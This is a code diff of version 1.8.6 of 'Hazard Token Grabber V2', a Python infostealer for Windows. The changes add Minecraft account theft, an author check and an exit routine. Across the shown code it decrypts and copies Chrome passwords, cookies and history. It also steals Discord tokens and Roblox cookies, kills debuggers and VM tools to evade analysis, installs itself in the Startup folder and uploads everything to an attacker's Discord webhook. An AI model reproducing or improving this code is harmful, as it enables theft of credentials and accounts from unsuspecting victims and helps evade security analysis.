@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.5'
+__version__ = '1.8.6'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -46,36 +46,11 @@ __config__ = {
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
-        "httpdebuggerui",
-        "wireshark",
-        "fiddler",
-        "regedit",
-        "cmd",
-        "taskmgr",
-        "vboxservice",
-        "df5serv",
-        "processhacker",
-        "vboxtray",
-        "vmtoolsd",
-        "vmwaretray",
-        "ida64",
-        "ollydbg",
-        "pestudio",
-        "vmwareuser",
-        "vgauthservice",
-        "vmacthlp",
-        "x96dbg",
-        "vmsrvc",
-        "x32dbg",
-        "vmusrvc",
-        "prl_cc",
-        "prl_tools",
-        "xenservice",
-        "qemu-ga",
-        "joeboxcontrol",
-        "ksdumperclient",
-        "ksdumper",
-        "joeboxserver"
+        "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr",
+        "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray",
+        "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp",
+        "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice",
+        "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"
     ]
 
 }
@@ -188,7 +163,7 @@ class HazardTokenGrabberV2(Functions):
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.chrome = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
+        self.chrome_user_data = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
         self.dir, self.temp = mkdtemp(), gettempdir()
         inf, net = self.system_info(), self.network_info()
         self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
@@ -196,16 +171,20 @@ class HazardTokenGrabberV2(Functions):
         self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
         self.hook_reg = "api/webhooks"
-        self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
+        self.chrome_reg = re.compile(r'(?:^profile\s\d*)|default|(?:guest profile$)', re.IGNORECASE | re.MULTILINE)
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
-        self.chrome_key = self.get_master_key(ntpath.join(self.chrome, "Local State"))
+        self.chrome_key = self.get_master_key(ntpath.join(self.chrome_user_data, "Local State"))
 
         os.makedirs(self.dir, exist_ok=True)
+
+    def hazard_exit(self):
+        shutil.rmtree(self.dir, ignore_errors=True)
+        os._exit(0)
 
     def try_extract(func):
         '''Decorator to safely catch and ignore exceptions'''
@@ -230,12 +209,18 @@ class HazardTokenGrabberV2(Functions):
 
     async def init(self):
         if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
-            os._exit(0)
-        if self.fetch_conf('anti_debug') and AntiDebug().inVM:
-            os._exit(0)
+            self.hazard_exit()
+
+        if __author__ != "\x52\x64\x69\x6d\x6f":
+            self.hazard_exit()
+
+        if self.fetch_conf('anti_debug') and AntiDebug().inVM is True:
+            self.hazard_exit()
+
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
-        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabRobloxCookie]
+
+        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabMinecraftCache, self.grabRobloxCookie]
         if self.fetch_conf('hide_self'):
             function_list.append(self.hide)
 
@@ -245,7 +230,8 @@ class HazardTokenGrabberV2(Functions):
         if self.fetch_conf('startup'):
             function_list.append(self.startup)
 
-        if ntpath.exists(self.chrome) and self.chrome_key is not None:
+        if ntpath.exists(self.chrome_user_data) and self.chrome_key is not None:
+            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
             function_list.extend([self.grabPassword, self.grabCookies, self.grabHistory])
 
         for func in function_list:
@@ -270,6 +256,7 @@ class HazardTokenGrabberV2(Functions):
             pass
 
     async def injector(self):
+        # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
@@ -379,7 +366,7 @@ class HazardTokenGrabberV2(Functions):
             'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
             'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.chrome + '\\Default\\Local Storage\\leveldb\\',
+            'Chrome': self.chrome_user_data + '\\Default\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
@@ -420,10 +407,10 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabPassword(self):
-        f = open(self.dir + '\\Google Passwords.txt', 'w', encoding="cp437", errors='ignore')
-        for prof in os.listdir(self.chrome):
+        f = open(ntpath.join(self.dir, 'Google', 'Google Passwords.txt'), 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome, prof, 'Login Data')
+                login_db = ntpath.join(self.chrome_user_data, prof, 'Login Data')
                 login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
@@ -446,10 +433,10 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabCookies(self):
-        f = open(self.dir + '\\Google Cookies.txt', 'w', encoding="cp437", errors='ignore')
-        for prof in os.listdir(self.chrome):
+        f = open(ntpath.join(self.dir, 'Google', 'Google Cookies.txt'), 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome, prof, 'Network', 'cookies')
+                login_db = ntpath.join(self.chrome_user_data, prof, 'Network', 'cookies')
                 login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
@@ -473,7 +460,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabHistory(self):
-        f = open(self.dir + '\\Google History.txt', 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google History.txt'), 'w', encoding="cp437", errors='ignore')
 
         def extract_search_history(db_cursor):
             db_cursor.execute('SELECT term FROM keyword_search_terms')
@@ -490,9 +477,9 @@ class HazardTokenGrabberV2(Functions):
                 web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
             return web
 
-        for prof in os.listdir(self.chrome):
+        for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome, prof, 'History')
+                login_db = ntpath.join(self.chrome_user_data, prof, 'History')
                 login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
@@ -548,6 +535,16 @@ class HazardTokenGrabberV2(Functions):
             billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
+
+    def grabMinecraftCache(self):
+        minecraft = ntpath.join(self.dir, 'Minecraft')
+        os.makedirs(minecraft, exist_ok=True)
+        mc = ntpath.join(self.roaming, '.minecraft')
+        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+
+        for _file in to_grab:
+            if ntpath.exists(ntpath.join(mc, _file)):
+                shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
 
     def grabRobloxCookie(self):
         def subproc(path):
@@ -626,13 +623,14 @@ GoogleMaps: {self.googlemap}
                 zipped_file.write(absname, arcname)
         zipped_file.close()
 
-        files_found = ''
-        for f in os.listdir(self.dir):
-            files_found += f"・{f}\n"
-        tokens = ''
+        file_count, files_found, tokens = 0, '', ''
+        for _, __, files in os.walk(self.dir):
+            for _file in files:
+                files_found += f"・{_file}\n"
+                file_count += 1
         for tkn in self.tokens:
             tokens += f'{tkn}\n\n'
-        fileCount = f"{len(files)} Files Found: "
+        fileCount = f"{file_count} Files Found: "
 
         embed = {
             'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
@@ -704,7 +702,7 @@ GoogleMaps: {self.googlemap}
                 httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                 httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
-        shutil.rmtree(self.dir, ignore_errors=True)
+        self.hazard_exit()
 
 
 class AntiDebug(Functions):
